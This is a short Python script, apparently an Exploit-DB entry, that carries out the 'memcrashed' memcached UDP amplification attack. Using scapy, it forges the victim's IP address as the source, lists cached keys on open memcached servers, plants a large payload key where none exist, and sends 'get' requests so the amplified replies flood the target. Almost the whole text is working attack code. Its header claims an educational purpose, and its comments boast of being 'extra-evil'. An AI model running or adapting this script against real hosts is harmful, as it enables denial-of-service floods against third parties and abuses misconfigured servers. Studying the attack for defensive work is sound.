# Written by Alex Conrey
# Download: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/44254.zip
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# This was created to better understand the memcrashed exploit 
# brought to light thanks to CloudFlare.
# (https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/)
#
# Please sysadmin responsibly.

import requests
import memcache
import re

from scapy.all import *

# Vulnerable memcached server list
SERVER_LIST = [
        '172.17.0.2:11211',
]

# Destination 
TARGET = '1.2.3.4'

# optional payload to set if no keys exist
payload = requests.get('https://google.com').text
payload_key = 'fuckit'

# this forces payload to load into memory for being extra-evil and efficient
if not payload:
    print 'Could not import payload, continuing anyway'

try:
    for server in SERVER_LIST:
        if ':' in server:
            server = server.split(':')[0]

        ip = IP(src=TARGET, dst=server)
        packet_base = '\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n'

        # fetch known keys by id
        statitems_packet = packet_base.format('stats items')
        udp = UDP(sport=50000, dport=11211)/statitems_packet
        keyids = []
        resp = sr1(ip/udp)
        for key in str(resp.payload).split('\r\n'):
            # Skip first line which has hex in it (I'm lazy)
            if 'age' in key:
                key = key.split(':')[1]
                keyids.append(key)

        # fetch names for keys by id
        keys = []
        for kid in keyids:
            query = 'stats cachedump {0} 100'.format(kid)
            keyid_packet = packet_base.format(query)
            udp = UDP(sport=50000, dport=11211)/keyid_packet
            resp = str(sr1(ip/udp).payload).split('\r\n')
            for key in resp:
                if 'ITEM' in key:
                    res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)",key)
                    keys.append(res.group('keyname'))

        # if keys not present on target, make one
        if not keys:
            mc = memcache.Client([server],debug=False)
            mc.set(payload_key, payload)
            keys.append(payload_key)

        # iterate thru known keys and blast away
        for key in keys:
            query = 'get {0}'.format(key)
            fun_packet = packet_base.format(query)
            udp = UDP(sport=50000, dport=11211)/fun_packet
            sr1(ip/udp)

except Exception:
    raise